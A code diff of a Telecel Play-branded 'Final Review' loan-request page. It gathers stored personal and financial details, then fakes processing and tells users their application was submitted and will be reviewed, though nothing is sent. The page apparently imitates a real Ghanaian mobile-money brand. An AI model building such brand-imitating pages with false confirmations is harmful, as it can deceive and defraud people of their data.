@@ -3,93 +3,104 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=yes">
-    <title>Telecel Play | Final Review – play.telecel.com.gh</title>
+    <title>Telecel Play | Final Review – Loan Request</title>
     <link rel="icon" href="https://play.telecel.com.gh/favicon.ico" type="image/x-icon">
     <meta name="theme-color" content="#E30613">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
 
-        html, body {
-            height: 100%;
-            font-family: 'Inter', sans-serif;
-            background: #f8f9fc;
-        }
-
         body {
+            font-family: 'Inter', sans-serif;
+            background: #f5f5f5;
+            min-height: 100vh;
             display: flex;
             flex-direction: column;
             align-items: center;
+            justify-content: center;
             padding: 12px;
-            overflow-y: auto;
-            overflow-x: hidden;
         }
 
-        header {
+        /* Main container – matches details page card */
+        .container {
             width: 100%;
-            max-width: 480px;
-            padding: 12px 16px;
-            text-align: center;
-            margin-bottom: 12px;
-            background: white;
-            border-radius: 12px;
-            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.06);
+            max-width: 360px;
+            margin: 0 auto;
+            background: #ffffff;
+            border-radius: 28px;
+            padding: 24px 16px 32px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
             position: relative;
+            overflow: hidden;
         }
 
-        .back-btn {
-            font-size: 28px;
-            background: none;
-            border: none;
-            cursor: pointer;
-            color: #2c3e50;
+        /* Top red blob (like login & details) */
+        .top-bg {
             position: absolute;
-            left: 16px;
-            top: 50%;
-            transform: translateY(-50%);
-            line-height: 1;
+            top: 0;
+            right: 0;
+            width: 200px;
+            height: 200px;
+            background: linear-gradient(135deg, rgba(255,0,0,0.2), rgba(255,0,0,0.5));
+            border-bottom-left-radius: 120px;
+            z-index: 0;
         }
 
-        .logo {
-            font-size: clamp(28px, 7vw, 40px);
-            font-weight: 800;
-            letter-spacing: -0.5px;
+        .form-card {
+            position: relative;
+            z-index: 2;
         }
 
-        .logo-telecel {
-            color: #E30613;
+        /* Error box – Telecel style (kept for consistency, though not heavily used) */
+        .error-box {
+            position: absolute;
+            top: 12px;
+            left: 12px;
+            right: 12px;
+            background: #fff;
+            border: 2px solid #ff4d4d;
+            border-radius: 14px;
+            padding: 12px;
+            display: none;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.12);
+            z-index: 100;
+            text-align: left;
         }
-
-        .logo-play {
-            color: #0033A0;
+        .error-title {
+            color: #ff0000;
+            font-weight: bold;
+            font-size: 14px;
+            margin-bottom: 4px;
         }
-
-        .card {
-            background: white;
-            border-radius: 20px;
-            padding: 24px 18px 32px;
-            width: 100%;
-            max-width: 480px;
-            box-shadow: 0 12px 48px rgba(0, 0, 0, 0.08);
-            display: flex;
-            flex-direction: column;
-            margin-bottom: 16px;
-        }
-
-        .top {
-            text-align: center;
-            flex: 1;
+        .error-text { color: #444; font-size: 13px; }
+        .close {
+            position: absolute;
+            right: 12px;
+            top: 8px;
+            cursor: pointer;
+            font-size: 20px;
+            color: #999;
         }
 
         .form-title {
-            font-size: clamp(24px, 6vw, 32px);
+            font-size: clamp(22px, 6vw, 28px);
             font-weight: 700;
             color: #1a1a1a;
-            margin-bottom: 12px;
+            text-align: center;
+            margin-bottom: 4px;
+        }
+
+        .sub-meta {
+            text-align: center;
+            color: #6c757d;
+            font-size: 13px;
+            margin-bottom: 1.5rem;
+            border-bottom: 1px solid #eee;
+            padding-bottom: 10px;
         }
 
         .progress-bar {
@@ -100,7 +111,6 @@
             margin: 16px auto 12px;
             overflow: hidden;
         }
-
         .progress-fill {
             width: 100%;
             height: 100%;
@@ -112,65 +122,50 @@
             font-size: 14px;
             font-weight: 500;
             margin-bottom: 24px;
+            text-align: center;
         }
 
+        .form-group {
+            margin-bottom: 1.5rem;
+            display: flex;
+            flex-direction: column;
+        }
         .form-label {
+            margin-bottom: 4px;
             font-weight: 600;
             color: #2c3e50;
-            margin-bottom: 8px;
-            font-size: 14px;
-            display: block;
-            text-align: left;
+            font-size: 13px;
+            line-height: 1.3;
         }
-
-        .form-select,
-        .form-input {
+        .form-select {
             width: 100%;
             padding: 12px 14px;
-            border: 1px solid #ced4da;
+            border: 1px solid #ddd;
             border-radius: 12px;
-            font-size: 15px;
-            margin-bottom: 4px;
-            transition: border-color 0.2s, box-shadow 0.2s;
-            background: #fdfdfe;
+            font-size: 14px;
+            background: #fff;
+            transition: all 0.2s;
         }
-
-        .form-select:focus,
-        .form-input:focus {
-            border-color: #E30613;
+        .form-select:focus {
+            border-color: #ff0000;
             outline: none;
-            box-shadow: 0 0 0 3px rgba(227, 6, 19, 0.15);
+            box-shadow: 0 0 0 2px rgba(255,0,0,0.2);
         }
-
         .invalid {
             border-color: #dc3545 !important;
+            box-shadow: 0 0 0 2px rgba(220,53,69,0.2) !important;
         }
 
         .error-message {
             color: #dc3545;
             font-size: 12px;
             font-weight: 500;
-            margin: 4px 0 16px 0;
+            margin: 4px 0 0 0;
             display: none;
             line-height: 1.4;
             text-align: left;
         }
-
-        .error-visible {
-            display: block;
-        }
-
-        .global-feedback {
-            color: #6c757d;
-            font-size: 13px;
-            text-align: center;
-            margin: 12px 0 20px;
-            padding: 10px;
-            background: #fff5f5;
-            border: 1px solid #ffebee;
-            border-radius: 12px;
-            display: none;
-        }
+        .error-visible { display: block; }
 
         .summary-box {
             background: #fff5f5;
@@ -181,7 +176,6 @@
             border: 1px solid #ffebee;
             text-align: left;
         }
-
         .summary-row {
             display: flex;
             justify-content: space-between;
@@ -190,63 +184,65 @@
             flex-wrap: wrap;
             gap: 8px;
         }
-
-        .summary-row:last-child {
-            margin-bottom: 0;
+        .summary-row:last-child { margin-bottom: 0; }
+        .summary-label {
+            font-weight: 500;
+            color: #2c3e50;
         }
-
         .summary-value {
             font-weight: 600;
             color: #1a1a1a;
             text-align: right;
         }
+        .divider {
+            height: 1px;
+            background: #eee;
+            margin: 16px 0;
+        }
 
         .btn-group {
             display: flex;
-            gap: 14px;
-            margin-top: 8px;
+            gap: 12px;
+            margin-top: 28px;
         }
-
-        .prev-btn,
-        .submit-btn {
+        .prev-btn, .submit-btn {
             flex: 1;
             padding: 14px 12px;
-            border: none;
             border-radius: 60px;
-            font-size: 16px;
+            font-size: 15px;
             font-weight: 700;
             cursor: pointer;
             transition: 0.2s;
             touch-action: manipulation;
+            text-align: center;
+            border: none;
         }
-
         .prev-btn {
             background: #e9ecef;
             color: #495057;
         }
-
-        .prev-btn:active {
-            transform: scale(0.97);
-        }
-
+        .prev-btn:active { transform: scale(0.97); }
         .submit-btn {
-            background: linear-gradient(90deg, #E30613, #b71c1c);
+            background: #ff0000;
             color: white;
-            box-shadow: 0 6px 18px rgba(227, 6, 19, 0.25);
+            box-shadow: 0 4px 12px rgba(255,0,0,0.3);
         }
-
-        .submit-btn:active {
-            transform: scale(0.97);
+        .submit-btn:active { transform: scale(0.97); }
+        .submit-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            transform: none;
         }
 
         footer {
-            padding: 16px 16px 20px;
-            color: #adb5bd;
-            font-size: 12px;
             text-align: center;
+            color: #adb5bd;
+            font-size: 11px;
+            margin-top: 20px;
+            max-width: 360px;
         }
 
-        /* Spinner overlay (cheat sheet style) */
+        /* Spinner overlay – Telecel style */
         #spinnerOverlay {
             position: fixed;
             top: 0;
@@ -260,7 +256,6 @@
             align-items: center;
             z-index: 1000;
         }
-
         .spinner {
             width: 44px;
             height: 44px;
@@ -269,12 +264,9 @@
             border-radius: 50%;
             animation: spin 1s linear infinite;
         }
+        @keyframes spin { to { transform: rotate(360deg); } }
 
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        /* Success overlay (preserved with minor mobile tuning) */
+        /* Success overlay – matches Telecel style */
         #successOverlay {
             position: fixed;
             top: 0;
@@ -288,7 +280,6 @@
             z-index: 1001;
             padding: 16px;
         }
-
         .success-card {
             background: white;
             border-radius: 28px;
@@ -298,7 +289,6 @@
             text-align: center;
             box-shadow: 0 20px 50px rgba(0, 0, 0, 0.2);
         }
-
         .check-icon {
             width: 72px;
             height: 72px;
@@ -311,21 +301,18 @@
             font-size: 44px;
             color: white;
         }
-
         .success-title {
             font-size: 24px;
             font-weight: 800;
             color: #00c853;
             margin-bottom: 12px;
         }
-
         .success-msg {
             font-size: 15px;
             color: #4a5568;
             line-height: 1.5;
             margin-bottom: 28px;
         }
-
         .redirect-bar {
             background: #f0f0f0;
             padding: 12px;
@@ -338,8 +325,7 @@
             justify-content: center;
             gap: 10px;
         }
-
-        .redirect-bar .loader {
+        .redirect-bar .mini-loader {
             width: 18px;
             height: 18px;
             border: 2px solid #f3f3f3;
@@ -347,7 +333,6 @@
             border-radius: 50%;
             animation: spin 1s linear infinite;
         }
-
         .go-login-btn {
             width: 100%;
             padding: 14px;
@@ -360,155 +345,237 @@
             cursor: pointer;
             transition: 0.2s;
         }
+        .go-login-btn:active { transform: scale(0.97); }
 
-        .go-login-btn:active {
-            transform: scale(0.97);
-        }
-
-        /* extra small device adjustments */
         @media (max-width: 380px) {
-            body {
-                padding: 8px;
-            }
-            .card {
-                padding: 20px 14px;
-            }
-            .summary-box {
-                padding: 14px;
-            }
-            .summary-row {
-                font-size: 13px;
-            }
-            .btn-group {
-                gap: 10px;
-            }
-            .prev-btn, .submit-btn {
-                padding: 12px;
-                font-size: 15px;
-            }
-            .success-card {
-                padding: 24px 18px;
-            }
+            body { padding: 8px; }
+            .container { padding: 20px 12px 28px; }
+            .summary-box { padding: 14px; }
+            .summary-row { font-size: 13px; }
+            .btn-group { gap: 8px; }
+            .prev-btn, .submit-btn { padding: 12px; font-size: 14px; }
+            .success-card { padding: 24px 18px; }
         }
     </style>
 </head>
-
 <body>
-    <header>
-        <button class="back-btn" onclick="history.back()">←</button>
-        <div class="logo"><span class="logo-telecel">Telecel</span><span class="logo-play">Play</span></div>
-    </header>
-    <main class="card">
-        <div class="top">
-            <h1 class="form-title">Final Review</h1>
-            <div class="progress-bar">
-                <div class="progress-fill"></div>
-            </div>
-            <div class="step-text">Step 3 of 3 – Confirm & Submit</div>
-            <label class="form-label">Employment Status</label>
-            <select class="form-select" id="employmentStatus">
-                <option>Employed</option>
-                <option>Self-Employed</option>
-                <option>Unemployed</option>
-                <option>Student</option>
+<div class="container">
+    <div class="top-bg"></div>
+    <div class="form-card">
+        <!-- Error box (for consistency) -->
+        <div class="error-box" id="errorBox">
+            <div class="close" onclick="hideError()">×</div>
+            <div class="error-title">Error</div>
+            <div class="error-text" id="errorText">Please fix the highlighted fields.</div>
+        </div>
+
+        <h1 class="form-title">Final Review</h1>
+        <div class="progress-bar"><div class="progress-fill"></div></div>
+        <div class="step-text">Step 3 of 3 – Confirm & Customize Loan</div>
+
+        <!-- Summary of user details (selective) -->
+        <div class="summary-box" id="summaryBox"></div>
+
+        <!-- Loan amount range and period (replaces employment/income) -->
+        <div class="form-group">
+            <label class="form-label">How much loan do you need? (GH₵) *</label>
+            <select class="form-select" id="loanAmountRange">
+                <option value="">Select range</option>
+                <option>50-99</option>
+                <option>100-499</option>
+                <option>500-999</option>
+                <option>1000+</option>
             </select>
-            <label class="form-label">Estimated Annual Income (GH₵)</label>
-            <input type="number" class="form-input" id="annualIncome" placeholder="e.g. 120000" inputmode="numeric">
-            <div class="error-message" id="errIncome">Kindly enter a valid annual income (minimum GH₵12,000 recommended).</div>
-            <div class="summary-box" id="summaryBox"></div>
-            <div class="global-feedback" id="globalFeedback">
-                Please review the information above and complete the required field to submit.
-            </div>
         </div>
+
+        <div class="form-group">
+            <label class="form-label">Loan repayment period *</label>
+            <select class="form-select" id="loanPeriod">
+                <option value="">Select period</option>
+                <option>1 week</option>
+                <option>2 weeks</option>
+                <option>1 month</option>
+                <option>3 months</option>
+                <option>6 months</option>
+                <option>1 year</option>
+            </select>
+        </div>
+        <div class="error-message" id="errLoan">Please select both loan amount range and repayment period.</div>
+
         <div class="btn-group">
-            <button class="prev-btn" onclick="history.back()">Previous Step</button>
-            <button class="submit-btn" id="submitBtn">Submit Application</button>
-        </div>
-    </main>
-    <footer>© 2026 Telecel Ghana – Licensed Mobile Financial Services | Powered by Telecel Cash & Telecel Play</footer>
-
-    <!-- Spinner Overlay (cheat sheet style) -->
-    <div id="spinnerOverlay">
-        <div class="spinner"></div>
-    </div>
-
-    <!-- Success Overlay -->
-    <div id="successOverlay">
-        <div class="success-card">
-            <div class="check-icon">✓</div>
-            <div class="success-title">Account Verification</div>
-            <div class="success-msg">
-                Your loan application has been successfully submitted.<br><br> You will be taken through account verification shortly. You should receive a confirmation via SMS or email once completed.
-            </div>
-            <div class="redirect-bar">
-                <div class="loader"></div>
-                Redirecting to Telecel Play in <span id="countdown">3</span>...
-            </div>
-            <button class="go-login-btn" onclick="window.location.href='login.html'">Go to Telecel Play Now</button>
+            <button class="prev-btn" id="prevBtn">PREVIOUS</button>
+            <button class="submit-btn" id="submitBtn">SUBMIT</button>
         </div>
     </div>
+</div>
+<footer>© 2026 Telecel Ghana – Licensed Mobile Financial Services | Powered by Telecel Cash & Telecel Play</footer>
 
-    <script>
-        const summaryBox = document.getElementById('summaryBox');
-        const loanAmount = localStorage.getItem('loanAmount') || '5000';
-        const formattedAmount = parseFloat(loanAmount).toLocaleString('en-US');
-        const termDays = localStorage.getItem('loanTerm') || '30';
-        summaryBox.innerHTML = `
-            <div class="summary-row"><span>Loan Type:</span><span class="summary-value">${localStorage.getItem('loanType') || 'Ready Loan'}</span></div>
-            <div class="summary-row"><span>Requested Amount:</span><span class="summary-value">GH₵ ${formattedAmount}</span></div>
-            <div class="summary-row"><span>Loan Term:</span><span class="summary-value">${termDays} days</span></div>
-            <div class="summary-row"><span>Purpose:</span><span class="summary-value">${localStorage.getItem('loanPurpose') || 'Not specified'}</span></div>
-            <div class="summary-row"><span>Applicant:</span><span class="summary-value">${localStorage.getItem('firstName') || ''} ${localStorage.getItem('lastName') || ''}</span></div>
-            <div class="summary-row"><span>Email:</span><span class="summary-value">${localStorage.getItem('email') || 'N/A'}</span></div>
-            <div class="summary-row"><span>Mobile Number:</span><span class="summary-value">+233 ${localStorage.getItem('phone') || 'N/A'}</span></div>
-        `;
+<div id="spinnerOverlay"><div class="spinner"></div></div>
+<div id="successOverlay">
+    <div class="success-card">
+        <div class="check-icon">✓</div>
+        <div class="success-title">Application Received</div>
+        <div class="success-msg">
+            Your loan request has been successfully submitted.<br><br>
+            You will receive a confirmation SMS shortly. Our team will review your financial profile and contact you within 24 hours.
+        </div>
+        <div class="redirect-bar">
+            <div class="mini-loader"></div>
+            Redirecting to Telecel Play in <span id="countdown">3</span>...
+        </div>
+        <button class="go-login-btn" id="goLoginBtn">Go to Telecel Play Now</button>
+    </div>
+</div>
 
-        // Pre-fill from localStorage if exists
-        if (localStorage.getItem('employmentStatus')) {
-            document.getElementById('employmentStatus').value = localStorage.getItem('employmentStatus');
-        }
-        if (localStorage.getItem('annualIncome')) {
-            document.getElementById('annualIncome').value = localStorage.getItem('annualIncome');
-        }
+<script>
+    // Helper: get from localStorage with fallback
+    const getStorage = (key, fallback = 'Not provided') => localStorage.getItem(key) || fallback;
 
-        document.getElementById('submitBtn').addEventListener('click', function() {
-            const income = document.getElementById('annualIncome').value.trim();
-            // Reset validation UI
-            document.getElementById('annualIncome').classList.remove('invalid');
-            document.getElementById('errIncome').classList.remove('error-visible');
-            document.getElementById('globalFeedback').style.display = 'none';
-            let isValid = true;
-            if (!income || Number(income) < 12000) {
-                document.getElementById('annualIncome').classList.add('invalid');
-                document.getElementById('errIncome').classList.add('error-visible');
-                document.getElementById('globalFeedback').style.display = 'block';
-                isValid = false;
-            }
-            if (!isValid) return;
-
-            // Save to localStorage
-            localStorage.setItem('employmentStatus', document.getElementById('employmentStatus').value);
-            localStorage.setItem('annualIncome', income);
-
-            // Show spinner, then success overlay with countdown
-            const spinnerOverlay = document.getElementById('spinnerOverlay');
-            spinnerOverlay.style.display = 'flex';
-            setTimeout(() => {
-                spinnerOverlay.style.display = 'none';
-                const successOverlay = document.getElementById('successOverlay');
-                successOverlay.style.display = 'flex';
-                let seconds = 3;
-                const countdownEl = document.getElementById('countdown');
-                const timer = setInterval(() => {
-                    seconds--;
-                    countdownEl.textContent = seconds;
-                    if (seconds <= 0) {
-                        clearInterval(timer);
-                        window.location.href = 'login.html';
-                    }
-                }, 1000);
-            }, 3000);
+    // Escape HTML for safety
+    function escapeHtml(str) {
+        if (!str) return '';
+        return String(str).replace(/[&<>]/g, function(m) {
+            if (m === '&') return '&amp;';
+            if (m === '<') return '&lt;';
+            if (m === '>') return '&gt;';
+            return m;
         });
-    </script>
+    }
+
+    // Build selective summary box (excludes current balance, defaults, outstanding)
+    const firstName = getStorage('firstName', '');
+    const lastName = getStorage('lastName', '');
+    const fullName = firstName && lastName ? `${firstName} ${lastName}` : (firstName || lastName || 'Not provided');
+    const phone = getStorage('phone', '');
+    const email = getStorage('email', '');
+    const ageGroup = getStorage('ageGroup', '');
+    const gender = getStorage('gender', '');
+    const employment = getStorage('employmentStatus', '');
+    const monthlyIncome = getStorage('monthlyIncome', '');
+    const monthlyNeeds = getStorage('monthlyNeeds', '');
+    const dependants = getStorage('dependants', '0');
+    const loanPurpose = getStorage('loanPurpose', 'Not specified');
+    const telecelTenure = getStorage('telecelTenure', '');
+    const usageFreq = getStorage('usageFrequency', '');
+    const weeklySpend = getStorage('weeklySpend', '');
+    const avgTransaction = getStorage('avgTransaction', '');
+    // Excluded: currentBalance, everDefaulted, outstandingLoans
+
+    // Phone number displayed without +233 prefix – just the raw digits
+    const displayPhone = phone ? phone : 'Not provided';
+
+    const summaryHtml = `
+        <div class="summary-row"><span class="summary-label">Full name:</span><span class="summary-value">${escapeHtml(fullName)}</span></div>
+        <div class="summary-row"><span class="summary-label">Phone number:</span><span class="summary-value">${escapeHtml(displayPhone)}</span></div>
+        <div class="summary-row"><span class="summary-label">Email:</span><span class="summary-value">${escapeHtml(email) || '—'}</span></div>
+        <div class="summary-row"><span class="summary-label">Age group:</span><span class="summary-value">${escapeHtml(ageGroup) || '—'}</span></div>
+        <div class="summary-row"><span class="summary-label">Gender:</span><span class="summary-value">${escapeHtml(gender) || 'Rather not say'}</span></div>
+        <div class="divider"></div>
+        <div class="summary-row"><span class="summary-label">Employment:</span><span class="summary-value">${escapeHtml(employment) || '—'}</span></div>
+        <div class="summary-row"><span class="summary-label">Monthly income:</span><span class="summary-value">${escapeHtml(monthlyIncome) || '—'}</span></div>
+        <div class="summary-row"><span class="summary-label">Monthly expenses:</span><span class="summary-value">${escapeHtml(monthlyNeeds) || '—'}</span></div>
+        <div class="summary-row"><span class="summary-label">Dependants:</span><span class="summary-value">${escapeHtml(dependants)}</span></div>
+        <div class="summary-row"><span class="summary-label">Loan purpose:</span><span class="summary-value">${escapeHtml(loanPurpose)}</span></div>
+        <div class="divider"></div>
+        <div class="summary-row"><span class="summary-label">Telecel Cash tenure:</span><span class="summary-value">${escapeHtml(telecelTenure) || '—'}</span></div>
+        <div class="summary-row"><span class="summary-label">Usage frequency:</span><span class="summary-value">${escapeHtml(usageFreq) || '—'}</span></div>
+        <div class="summary-row"><span class="summary-label">Spend (${usageFreq?.toLowerCase() || 'weekly'}):</span><span class="summary-value">GH₵ ${escapeHtml(weeklySpend) || '—'}</span></div>
+        <div class="summary-row"><span class="summary-label">Avg transaction amount:</span><span class="summary-value">GH₵ ${escapeHtml(avgTransaction) || '—'}</span></div>
+    `;
+    document.getElementById('summaryBox').innerHTML = summaryHtml;
+
+    // Pre-fill dropdowns if previously saved (optional)
+    const loanRangeSelect = document.getElementById('loanAmountRange');
+    const loanPeriodSelect = document.getElementById('loanPeriod');
+    const errLoan = document.getElementById('errLoan');
+    const submitBtn = document.getElementById('submitBtn');
+    const prevBtn = document.getElementById('prevBtn');
+    const spinnerOverlay = document.getElementById('spinnerOverlay');
+    const successOverlay = document.getElementById('successOverlay');
+
+    if (localStorage.getItem('finalLoanRange')) {
+        loanRangeSelect.value = localStorage.getItem('finalLoanRange');
+    }
+    if (localStorage.getItem('finalLoanPeriod')) {
+        loanPeriodSelect.value = localStorage.getItem('finalLoanPeriod');
+    }
+
+    // Validation
+    function validateSelections() {
+        let valid = true;
+        errLoan.classList.remove('error-visible');
+        if (!loanRangeSelect.value) {
+            loanRangeSelect.classList.add('invalid');
+            valid = false;
+        } else {
+            loanRangeSelect.classList.remove('invalid');
+        }
+        if (!loanPeriodSelect.value) {
+            loanPeriodSelect.classList.add('invalid');
+            valid = false;
+        } else {
+            loanPeriodSelect.classList.remove('invalid');
+        }
+        if (!valid) {
+            errLoan.classList.add('error-visible');
+        }
+        return valid;
+    }
+
+    // Hide error box (global)
+    window.hideError = function() {
+        const eb = document.getElementById('errorBox');
+        if (eb) eb.style.display = 'none';
+    };
+
+    // Submit handler
+    submitBtn.addEventListener('click', function() {
+        if (!validateSelections()) return;
+
+        // Save final selections
+        localStorage.setItem('finalLoanRange', loanRangeSelect.value);
+        localStorage.setItem('finalLoanPeriod', loanPeriodSelect.value);
+
+        // Show spinner
+        spinnerOverlay.style.display = 'flex';
+        submitBtn.disabled = true;
+
+        // Simulate processing (3 seconds)
+        setTimeout(() => {
+            spinnerOverlay.style.display = 'none';
+            successOverlay.style.display = 'flex';
+            let seconds = 3;
+            const countdownSpan = document.getElementById('countdown');
+            const timer = setInterval(() => {
+                seconds--;
+                if (countdownSpan) countdownSpan.textContent = seconds;
+                if (seconds <= 0) {
+                    clearInterval(timer);
+                    window.location.href = 'login.html';
+                }
+            }, 1000);
+        }, 3000);
+    });
+
+    // Previous button goes back to details page
+    prevBtn.addEventListener('click', () => {
+        window.location.href = 'details.html';
+    });
+
+    // Manual redirect for "Go to Telecel Play Now" button
+    document.getElementById('goLoginBtn').addEventListener('click', () => {
+        window.location.href = 'login.html';
+    });
+
+    // Clear validation errors on change
+    loanRangeSelect.addEventListener('change', () => {
+        loanRangeSelect.classList.remove('invalid');
+        errLoan.classList.remove('error-visible');
+    });
+    loanPeriodSelect.addEventListener('change', () => {
+        loanPeriodSelect.classList.remove('invalid');
+        errLoan.classList.remove('error-visible');
+    });
+</script>
 </body>
 </html>
